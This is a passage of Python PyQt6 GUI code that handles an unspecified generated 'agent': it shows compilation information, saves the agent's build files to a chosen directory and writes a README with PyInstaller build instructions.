        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate agent:\\n{str(e)}")
    
    def compile_agent(self):
        """Compile agent to executable"""
        if not hasattr(self, 'current_agent_result'):
            QMessageBox.warning(self, "Warning", "No agent to compile. Generate one first.")
            return
        
        try:
            result = self.current_agent_result
            config = result["compilation_config"]
            
            # Show compilation info
            info_text = f"""
Agent Compilation Information:

Target Binary: {config['name']}
Description: {config['description']}

Compilation Command:
{result['compilation_command']}

Required Files:
{', '.join(result['build_files'].keys())}

Note: This will create the build files. You need PyInstaller installed to compile.
            """
            
            QMessageBox.information(self, "Compilation Info", info_text)
            
            # You could implement actual compilation here if PyInstaller is available
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to compile agent:\\n{str(e)}")
    
    def save_build_files(self):
        """Save all build files to directory"""
        if not hasattr(self, 'current_agent_result'):
            QMessageBox.warning(self, "Warning", "No agent build files to save. Generate agent first.")
            return
        
        try:
            from PyQt6.QtWidgets import QFileDialog
            
            # Select directory
            directory = QFileDialog.getExistingDirectory(self, "Select Build Directory")
            if not directory:
                return
            
            result = self.current_agent_result
            saved_files = []
            
            # Save all build files
            for filename, content in result["build_files"].items():
                file_path = os.path.join(directory, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                saved_files.append(filename)
            
            # Create README
            readme_content = f"""
# Agent Build Files

Generated: {datetime.now().isoformat()}
Agent Type: {self.agent_type.currentText()}
Binary: {result['compilation_config']['name']}

## Files:
{chr(10).join([f"- {f}" for f in saved_files])}

## Compilation:
Run build.bat or use the command:
{result['compilation_command']}

## Requirements:
- Python 3.x
- PyInstaller (pip install pyinstaller)
            """
            
            readme_path = os.path.join(directory, "README.txt")
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write(readme_content)
            
            QMessageBox.information(self, "Success", 
                f"Build files saved successfully!\\n"
                f"Location: {directory}\\n"
                f"Files: {len(saved_files) + 1} (including README.txt)")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save build files:\\n{str(e)}")
